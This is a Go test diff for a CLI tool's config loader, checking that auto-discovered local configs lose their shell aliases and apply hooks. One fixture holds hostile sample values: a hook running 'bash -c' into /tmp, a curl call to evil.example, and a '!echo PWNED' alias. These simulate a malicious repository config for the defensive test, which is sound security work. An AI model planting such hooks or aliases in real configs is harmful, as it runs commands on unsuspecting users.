@@ -813,6 +813,177 @@ contexts:
 	}
 }
 
+// TestLoad_LocalConfigStripsExecKeys verifies the AI-36 hardening: an
+// auto-discovered local .dtctl.yaml must never contribute code-execution keys
+// (shell aliases or apply hooks), and Load must flag that they were stripped.
+func TestLoad_LocalConfigStripsExecKeys(t *testing.T) {
+	// NOT parallel: os.Chdir is process-global and races with other tests.
+	tmpDir, err := os.MkdirTemp("", "dtctl-strip-exec-*")
+	if err != nil {
+		t.Fatalf("Failed to create temp dir: %v", err)
+	}
+	defer os.RemoveAll(tmpDir)
+
+	localConfigPath := filepath.Join(tmpDir, LocalConfigName)
+	localContent := `apiVersion: v1
+kind: Config
+current-context: local-ctx
+contexts:
+  - name: local-ctx
+    context:
+      environment: https://local.dt.com
+      token-ref: local-token
+      hooks:
+        pre-apply: "bash -c 'id > /tmp/pwned'"
+        post-apply: "curl -s https://evil.example"
+preferences:
+  hooks:
+    pre-apply: "evil-global-pre"
+    post-apply: "evil-global-post"
+aliases:
+  version: "!echo PWNED > /tmp/pwned"
+  wf: "get workflows"
+`
+	if err := os.WriteFile(localConfigPath, []byte(localContent), 0600); err != nil {
+		t.Fatalf("Failed to write local config: %v", err)
+	}
+
+	origWd, err := os.Getwd()
+	if err != nil {
+		t.Fatalf("Failed to get working directory: %v", err)
+	}
+	defer func() { _ = os.Chdir(origWd) }()
+
+	if err := os.Chdir(tmpDir); err != nil {
+		t.Fatalf("Failed to change directory: %v", err)
+	}
+
+	cfg, err := Load()
+	if err != nil {
+		t.Fatalf("Load() error = %v", err)
+	}
+
+	// Non-executable config is still honored.
+	if cfg.CurrentContext != "local-ctx" {
+		t.Errorf("CurrentContext = %q, want local-ctx", cfg.CurrentContext)
+	}
+
+	// Code-execution keys must be stripped.
+	if len(cfg.Aliases) != 0 {
+		t.Errorf("Aliases = %v, want empty (stripped from local config)", cfg.Aliases)
+	}
+	if _, ok := cfg.GetAlias("version"); ok {
+		t.Error("GetAlias(version) returned an alias; local aliases must be stripped")
+	}
+	if cfg.GetPreApplyHook() != "" {
+		t.Errorf("GetPreApplyHook() = %q, want empty (stripped)", cfg.GetPreApplyHook())
+	}
+	if cfg.GetPostApplyHook() != "" {
+		t.Errorf("GetPostApplyHook() = %q, want empty (stripped)", cfg.GetPostApplyHook())
+	}
+	if cfg.Preferences.Hooks != (Hooks{}) {
+		t.Errorf("Preferences.Hooks = %+v, want zero", cfg.Preferences.Hooks)
+	}
+
+	// Metadata for the caller-facing warning.
+	if !cfg.IsLocal() {
+		t.Error("IsLocal() = false, want true")
+	}
+	if !cfg.StrippedExecKeys() {
+		t.Error("StrippedExecKeys() = false, want true")
+	}
+	gotPath, _ := filepath.EvalSymlinks(cfg.LocalConfigPath())
+	wantPath, _ := filepath.EvalSymlinks(localConfigPath)
+	if gotPath != wantPath {
+		t.Errorf("LocalConfigPath() = %q, want %q", gotPath, wantPath)
+	}
+}
+
+// TestLoad_LocalConfigNoExecKeys verifies that a clean local config (no aliases
+// or hooks) loads without being flagged as stripped.
+func TestLoad_LocalConfigNoExecKeys(t *testing.T) {
+	// NOT parallel: os.Chdir is process-global and races with other tests.
+	tmpDir, err := os.MkdirTemp("", "dtctl-no-exec-*")
+	if err != nil {
+		t.Fatalf("Failed to create temp dir: %v", err)
+	}
+	defer os.RemoveAll(tmpDir)
+
+	localConfigPath := filepath.Join(tmpDir, LocalConfigName)
+	localContent := `apiVersion: v1
+kind: Config
+current-context: local-ctx
+contexts:
+  - name: local-ctx
+    context:
+      environment: https://local.dt.com
+      token-ref: local-token
+`
+	if err := os.WriteFile(localConfigPath, []byte(localContent), 0600); err != nil {
+		t.Fatalf("Failed to write local config: %v", err)
+	}
+
+	origWd, err := os.Getwd()
+	if err != nil {
+		t.Fatalf("Failed to get working directory: %v", err)
+	}
+	defer func() { _ = os.Chdir(origWd) }()
+
+	if err := os.Chdir(tmpDir); err != nil {
+		t.Fatalf("Failed to change directory: %v", err)
+	}
+
+	cfg, err := Load()
+	if err != nil {
+		t.Fatalf("Load() error = %v", err)
+	}
+
+	if !cfg.IsLocal() {
+		t.Error("IsLocal() = false, want true")
+	}
+	if cfg.StrippedExecKeys() {
+		t.Error("StrippedExecKeys() = true, want false (no exec keys present)")
+	}
+}
+
+// TestLoadFrom_ExplicitConfigKeepsExecKeys verifies that an explicit config
+// path (e.g. --config) is trusted and retains aliases/hooks; only
+// auto-discovered local configs are sanitized.
+func TestLoadFrom_ExplicitConfigKeepsExecKeys(t *testing.T) {
+	t.Parallel()
+	tmpDir := t.TempDir()
+	path := filepath.Join(tmpDir, "explicit-config.yaml")
+	content := `apiVersion: v1
+kind: Config
+aliases:
+  wf: "get workflows"
+preferences:
+  hooks:
+    pre-apply: "bash validate.sh"
+`
+	if err := os.WriteFile(path, []byte(content), 0600); err != nil {
+		t.Fatalf("Failed to write config: %v", err)
+	}
+
+	cfg, err := LoadFrom(path)
+	if err != nil {
+		t.Fatalf("LoadFrom() error = %v", err)
+	}
+
+	if cfg.IsLocal() {
+		t.Error("IsLocal() = true, want false for explicit config path")
+	}
+	if cfg.StrippedExecKeys() {
+		t.Error("StrippedExecKeys() = true, want false for explicit config path")
+	}
+	if _, ok := cfg.GetAlias("wf"); !ok {
+		t.Error("GetAlias(wf) missing; explicit config must retain aliases")
+	}
+	if cfg.Preferences.Hooks.PreApply != "bash validate.sh" {
+		t.Errorf("PreApply hook = %q, want retained", cfg.Preferences.Hooks.PreApply)
+	}
+}
+
 func TestConfig_DeleteContext(t *testing.T) {
 	t.Parallel()
 	tests := []struct {
